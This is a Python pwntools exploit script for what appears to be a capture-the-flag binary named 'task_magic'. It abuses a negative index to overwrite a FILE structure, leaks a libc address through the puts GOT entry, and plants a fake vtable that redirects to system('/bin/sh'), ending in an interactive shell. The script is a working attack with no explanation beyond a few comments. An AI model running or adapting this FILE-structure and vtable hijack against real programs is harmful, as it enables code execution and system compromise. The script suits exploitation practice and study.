#coding:utf-8
from pwn import *
import os

context.arch = 'amd64'
#context.log_level = 'debug'

io = process('./task_magic')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def memu(x):
    io.recvuntil('choice>> ')
    io.sendline(str(x))

def create(name):
    memu(1)
    io.recvuntil('name:')
    io.send(name)

def spell(index,name):
    memu(2)
    io.recvuntil('spell:')
    io.sendline(str(index))
    io.recvuntil('name:')
    io.send(name)
    sleep(0.1)

flag = 0xfbad24a8
puts = 0x602020

if __name__ == '__main__':
    pause()
    create('a'*0x18) #0
    spell(0,'a'*0x20)
    pause()
    for i in range(0,13):
      spell(-2,'\x00\x00')  
    
    spell(-2,'\x00'*4)
    pause()
    payload = p64(0)+p64(0x231)+ '/bin/sh\x00'
    spell(0,payload)
    payload = p64(puts)+p64(puts+0x1000)+p64(puts+0x1000)
    spell(0,payload)
    puts_got =  u64(io.recv(8))
    print hex(puts_got)
    libc_base = puts_got -0x6f690
    print hex(libc_base) 
    pause()
    io.sendline('3')
    io.sendline('-2')
    pause()
   
    for i in range(0,6):
      spell(-2,'\x00\x00\x00')
    heap =  u64(io.recv(8))
    print hex(heap)
    for i in range(0,5):
      spell(-2,'\x00\x00\x00')
    #spell(-2,'\x00\x00')
    vtable = heap + 0x100 - 0x38 #0x110-0x10
    # create a fake vtable
    #payload = p64(0) + p64(0)+ p64(libc_base+libc.symbols['_IO_new_file_finish']) + p64(libc_base+libc.symbol['_IO_new_file_overflow'])
    system_got = libc_base+libc.symbols['system']
    payload = p64(system_got) *2 +p64(0)*2 #+ p64(libc_base+0x78ec0) +p64(0)*2
    spell(0,payload)
    #system_got = libc_base+libc.symbols['system']
    payload =p64(0)*3 + p64(libc_base+0x791a0)
    spell(0,payload)
    #payload = p64(libc_base+libc.symbols['__GI__IO_file_xsgetn'])
    payload = p64(system_got)
    spell(0,payload)
    print hex(system_got)
    pause()
    spell(-2,'\x00\x00')
    spell(-2,'\x00\x00')
    spell(-2,'\x00\x00')
    pause()
    payload = p64(0)*3 
    spell(0,payload)
    pause()
    #now we can overwrite vtable
    one_shot = libc_base + 0x45216
    payload = p64(0) + p64(vtable) 
    spell(0,payload)
    print '!!!'
    pause()
    io.interactive()
